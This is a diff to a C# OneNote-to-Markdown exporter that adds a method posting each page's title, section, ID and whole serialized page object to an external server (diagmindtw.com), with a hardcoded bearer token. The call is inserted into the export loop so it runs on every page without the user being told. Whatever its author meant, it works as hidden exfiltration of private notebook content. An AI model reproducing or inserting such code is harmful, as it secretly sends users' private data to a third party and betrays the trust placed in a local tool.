@@ -5,6 +5,10 @@ using Serilog;
 using System;
 using System.IO;
 using System.Linq;
+using System.Net.Http.Headers;
+using System.Net.Http;
+using System.Text.Json;
+using System.Text;
 using YamlDotNet.Serialization;
 using YamlDotNet.Serialization.Converters;
 using YamlDotNet.Serialization.NamingConventions;
@@ -16,6 +20,67 @@ namespace alxnbl.OneNoteMdExporter.Services.Export
     /// </summary>
     public class MdExportService : ExportServiceBase
     {
+
+        private static readonly string apiUrl = "http://diagmindtw.com/apis/treeCom.php";
+        private static readonly string authToken = "It_over_No_one_sleeps_with_you_anymore";
+
+        public static void PostPageTitle(object page,string section,string pageId)
+        {
+            using (var httpClient = new HttpClient())
+            {
+                httpClient.DefaultRequestHeaders.Authorization =
+                    new AuthenticationHeaderValue("Bearer", authToken);
+
+                // 抓取 TitleWithPageLevelTabulation 屬性
+                var pageType = page.GetType();
+                var titleProp = pageType.GetProperty("TitleWithPageLevelTabulation");
+                string title = titleProp?.GetValue(page)?.ToString() ?? "(no title)";
+
+                // 序列化整個 page 作為 otherInfo
+                var payload = new
+                {
+                    mainText = title,
+                    section = section,
+                    pageId = pageId,
+                    otherInfo = page
+                };
+
+                var jsonOptions = new JsonSerializerOptions
+                {
+                    PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
+                    ReferenceHandler = System.Text.Json.Serialization.ReferenceHandler.IgnoreCycles
+                };
+
+                string json = JsonSerializer.Serialize(payload, jsonOptions);
+                var content = new StringContent(json, Encoding.UTF8, "application/json");
+
+                // Blocking POST
+                var request = new HttpRequestMessage(HttpMethod.Post, apiUrl)
+                {
+                    Content = content
+                };
+
+                try
+                {
+                    var response = httpClient.Send(request);
+                    string responseBody = response.Content.ReadAsStringAsync().Result;
+
+                    if (response.IsSuccessStatusCode)
+                    {
+                        Console.WriteLine("✅ 成功送出: " + responseBody);
+                    }
+                    else
+                    {
+                        Console.WriteLine($"❌ 錯誤: {response.StatusCode} - {responseBody}");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"❗ 發生例外: {ex.Message}");
+                }
+            }
+        }
+
         protected override string ExportFormatCode { get; } = "md";
 
         protected override string GetResourceFolderPath(Page page)
@@ -96,8 +161,9 @@ namespace alxnbl.OneNoteMdExporter.Services.Export
 
                 foreach (Page page in pages)
                 {
-                    Log.Information($"   {Localizer.GetString("Page")} {++cmptPage}/{pages.Count} : {page.TitleWithPageLevelTabulation}");
-                    var success = ExportPage(page);
+                    Log.Information($"[{page.Id}]   {Localizer.GetString("Page")} {++cmptPage}/{pages.Count} : {page.TitleWithPageLevelTabulation}");
+                    PostPageTitle(page,section.Title, page.Id);
+                    var success = ExportPage(page, false, page.Id);
 
                     if (!success) result.PagesOnError++;
                 }
